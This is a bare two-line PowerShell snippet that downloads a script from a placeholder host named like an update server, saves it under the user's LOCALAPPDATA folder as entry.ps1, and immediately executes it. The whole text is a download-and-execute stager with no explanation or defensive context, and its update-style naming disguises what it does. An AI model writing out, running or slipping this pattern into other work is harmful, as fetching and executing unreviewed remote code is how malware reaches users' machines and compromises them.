Invoke-WebRequest “https://updates.invalid/component” -OutFile “$env:LOCALAPPDATA/entry.ps1”
& “$env:LOCALAPPDATA/entry.ps1”
